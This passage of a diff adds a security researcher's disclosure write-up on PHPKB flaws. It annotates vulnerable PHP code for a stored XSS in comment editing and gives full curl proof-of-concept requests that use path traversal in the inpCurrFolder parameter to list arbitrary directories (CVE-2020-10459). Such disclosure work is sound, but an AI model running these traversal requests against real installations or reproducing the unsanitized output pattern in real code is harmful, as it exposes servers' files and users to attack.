+						WHERE </span><span class="si">{</span><span class="nv">$comments_fetch_query</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="nv">$article_id_query</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="nv">$articles_string</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="nv">$lang_part</span><span class="si">}</span><span class="s2">
+						</span><span class="si">{</span><span class="nv">$orderby_query</span><span class="si">}</span><span class="s2"> 
+						LIMIT </span><span class="si">{</span><span class="nv">$from</span><span class="si">}</span><span class="s2">,</span><span class="si">{</span><span class="nv">$range</span><span class="si">}</span><span class="s2">"</span><span class="p">;</span> <span class="c1">//The query is prepared</span>
+	<span class="nv">$results</span>		<span class="o">=</span> <span class="nf">mysqli_query</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">'connection'</span><span class="p">],</span> <span class="nv">$query</span><span class="p">);</span> <span class="c1">//The query is executed</span>
+<span class="c1">//Skipping some code</span>
+									<span class="nv">$detect</span>	<span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">"&amp;acute;"</span><span class="p">,</span><span class="s2">"&amp;lsquo;"</span><span class="p">,</span><span class="s2">"&amp;rsquo;"</span><span class="p">,</span><span class="s2">" &amp;amp; "</span><span class="p">,</span><span class="s2">"&amp;quot;"</span><span class="p">,</span><span class="s2">"&amp;mdash;"</span><span class="p">,</span><span class="s2">"&amp;rsquo;"</span><span class="p">,</span><span class="s2">"&amp;#92;"</span><span class="p">);</span>
+									<span class="nv">$change</span>	<span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">"´"</span><span class="p">,</span><span class="s2">"‘"</span><span class="p">,</span><span class="s2">"’"</span><span class="p">,</span><span class="s2">" &amp; "</span><span class="p">,</span><span class="s1">'"'</span><span class="p">,</span><span class="s2">"—"</span><span class="p">,</span><span class="s2">"'"</span><span class="p">,</span><span class="s2">"</span><span class="se">\\</span><span class="s2">"</span><span class="p">);</span>
+									<span class="k">while</span><span class="p">(</span><span class="nv">$record</span> <span class="o">=</span> <span class="nf">mysqli_fetch_assoc</span><span class="p">(</span><span class="nv">$results</span><span class="p">))</span>
+									<span class="p">{</span>
+<span class="c1">// Skipping some code</span>
+										<span class="nv">$comment</span>	<span class="o">=</span> <span class="nb">strip_tags</span><span class="p">(</span><span class="nb">str_replace</span><span class="p">(</span><span class="nv">$detect</span><span class="p">,</span> <span class="nv">$change</span><span class="p">,</span> <span class="nb">htmlspecialchars_decode</span><span class="p">(</span><span class="nv">$record</span><span class="p">[</span><span class="s1">'comment'</span><span class="p">])));</span> <span class="c1">//Once the comment has been retrieved from the database, the function htmlspecialchars_decode() is used to convert the sanitized comment (in html entities) back to the original, unsanitized, comment (in characters)</span>
+<span class="c1">// Skipping some code</span>
+													<span class="o">&lt;</span><span class="n">a</span> <span class="n">class</span><span class="o">=</span><span class="err">\</span><span class="s2">"editlink_</span><span class="si">{</span><span class="nv">$comment_id</span><span class="si">}</span><span class="se">\"</span><span class="s2"> data-value=</span><span class="se">\"</span><span class="si">{</span><span class="nv">$comment</span><span class="si">}</span><span class="se">\"</span><span class="s2"> data-name=</span><span class="se">\"</span><span class="s2">comment</span><span class="se">\"</span><span class="s2"> data-pk=</span><span class="se">\"</span><span class="si">{</span><span class="nv">$comment_id</span><span class="si">}</span><span class="se">\"</span><span class="s2"> data-type=</span><span class="se">\"</span><span class="s2">textarea</span><span class="se">\"</span><span class="s2"> id=</span><span class="se">\"</span><span class="si">{</span><span class="nv">$e_prefix</span><span class="si">}{</span><span class="nv">$comment_id</span><span class="si">}</span><span class="se">\"</span><span class="s2"> href=</span><span class="se">\"</span><span class="s2">javascript:;</span><span class="se">\"</span><span class="s2">&gt;&lt;i class=</span><span class="se">\"</span><span class="s2">fa fa-pencil </span><span class="si">{</span><span class="nv">$hidden_xs</span><span class="si">}</span><span class="se">\"</span><span class="s2">&gt;&lt;/i&gt; &lt;small class='btn btn-default btn-xs </span><span class="si">{</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">'visible_xs'</span><span class="p">]</span><span class="si">}{</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">'hidden_sm'</span><span class="p">]</span><span class="si">}{</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">'hidden_md'</span><span class="p">]</span><span class="si">}{</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">'hidden_lg'</span><span class="p">]</span><span class="si">}</span><span class="s2">'&gt;&lt;i class=</span><span class="se">\"</span><span class="s2">fa fa-pencil</span><span class="se">\"</span><span class="s2">&gt;&lt;/i&gt; Quick Edit&lt;/small&gt;&lt;/a&gt; //Here lies the vulnerability, the </span><span class="nv">$comment</span><span class="s2"> variable is echoed back in the response without being sanitized (it was)</span></code></pre></figure>
+
+<p>Proof of concept:</p>
+
+<p><a href="https://vimeo.com/490371978">Video</a></p>
+
+<h2 id="arbitrary-file-listing-cve-2020-10459">Arbitrary File Listing (CVE-2020-10459)</h2>
+<p>Exploitable by: Superuser/Editor/Writer/Translator</p>
+
+<p>Vulnerable file: admin/assetmanager/functions.php</p>
+
+<p>“AssetManager”, a small utility implemented by PHPKB, is used to manage all the files that have been uploaded. We have an option to upload files into different folders that are fixed by default. Inside the AssetManager there is an option to change the current working directory to the fixed ones, however there isn’t any check done on the back-end so we can tamper the request. This vulnerability arises because everytime we change the current working directory, the AssetManger shows all the files in that folder; this is the request that is being sent when we try to change the directory into a fixed one:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">curl <span class="nt">-i</span> <span class="nt">-s</span> <span class="nt">-k</span> <span class="nt">-X</span> <span class="s1">$'POST'</span> <span class="se">\</span>
+    <span class="nt">-H</span> <span class="s1">$'Host: localhost'</span> <span class="nt">-H</span> <span class="s1">$'User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0'</span> <span class="nt">-H</span> <span class="s1">$'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'</span> <span class="nt">-H</span> <span class="s1">$'Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3'</span> <span class="nt">-H</span> <span class="s1">$'Accept-Encoding: gzip, deflate'</span> <span class="nt">-H</span> <span class="s1">$'Content-Type: application/x-www-form-urlencoded'</span> <span class="nt">-H</span> <span class="s1">$'Content-Length: 77'</span> <span class="nt">-H</span> <span class="s1">$'Origin: http://localhost'</span> <span class="nt">-H</span> <span class="s1">$'Connection: close'</span> <span class="nt">-H</span> <span class="s1">$'Referer: http://localhost/phpkb/admin/assetmanager/assetmanager.php'</span> <span class="nt">-H</span> <span class="s1">$'Cookie: phpkb-rvaids=1; PHPSESSID=to900ejgfjfp3bs0v722o1ggoi'</span> <span class="nt">-H</span> <span class="s1">$'Upgrade-Insecure-Requests: 1'</span> <span class="se">\</span>
+    <span class="nt">-b</span> <span class="s1">$'phpkb-rvaids=1; PHPSESSID=AUTHCOOKIE'</span> <span class="se">\</span>
+    <span class="nt">--data-binary</span> <span class="s1">$'inpFileToDelete=&amp;inpCurrFolder=..%2F..%2Fassets%2Fimportcomplete&amp;del_refresh='</span> <span class="se">\</span>
+    <span class="s1">$'http://localhost/phpkb/admin/assetmanager/assetmanager.php?ffilter=&amp;selView=list&amp;forpdf='</span></code></pre></figure>
+
+<p>We traverse directory by injecting our payload into the POST parameter inpCurrFolder; I’ve created a folder called test in the root directoy of my drive and I’m going to use this proof of concept to show the vulnerability:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">curl <span class="nt">-i</span> <span class="nt">-s</span> <span class="nt">-k</span> <span class="nt">-X</span> <span class="s1">$'POST'</span> <span class="se">\</span>
+    <span class="nt">-H</span> <span class="s1">$'Host: localhost'</span> <span class="nt">-H</span> <span class="s1">$'User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0'</span> <span class="nt">-H</span> <span class="s1">$'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'</span> <span class="nt">-H</span> <span class="s1">$'Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3'</span> <span class="nt">-H</span> <span class="s1">$'Accept-Encoding: gzip, deflate'</span> <span class="nt">-H</span> <span class="s1">$'Content-Type: application/x-www-form-urlencoded'</span> <span class="nt">-H</span> <span class="s1">$'Content-Length: 208'</span> <span class="nt">-H</span> <span class="s1">$'Origin: http://localhost'</span> <span class="nt">-H</span> <span class="s1">$'Connection: close'</span> <span class="nt">-H</span> <span class="s1">$'Referer: http://localhost/phpkb/admin/assetmanager/assetmanager.php'</span> <span class="nt">-H</span> <span class="s1">$'Cookie: phpkb-rvaids=1; PHPSESSID=to900ejgfjfp3bs0v722o1ggoi'</span> <span class="nt">-H</span> <span class="s1">$'Upgrade-Insecure-Requests: 1'</span> <span class="se">\</span>
+    <span class="nt">-b</span> <span class="s1">$'phpkb-rvaids=1; PHPSESSID=to900ejgfjfp3bs0v722o1ggoi'</span> <span class="se">\</span>
+    <span class="nt">--data-binary</span> <span class="s1">$'inpFileToDelete=&amp;inpCurrFolder=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftest&amp;del_refresh='</span> <span class="se">\</span>
+    <span class="s1">$'http://localhost/phpkb/admin/assetmanager/assetmanager.php?ffilter=&amp;selView=list&amp;forpdf='</span></code></pre></figure>
+
+<p><a href="https://vimeo.com/490372122">Video</a></p>
+
+<p>That’s all for part one!</p>
+
+</div>
+
+
+
+<div class="pagination">
+  
+    <a href="/phpkb2" class="left arrow">&#8592;</a>
+  
+  
+    <a href="/fastweb" class="right arrow">&#8594;</a>
+  
+
+  <a href="#" class="top">Top</a>
+</div>
+    </main>
+
+    <footer>
+  <span>
+    2019 - <time datetime="2021-06-18 19:25:00 +0000">2021 </time>Antonio Cannito &copy;
+  </span>
+</footer>
+
+  </body>
+</html>
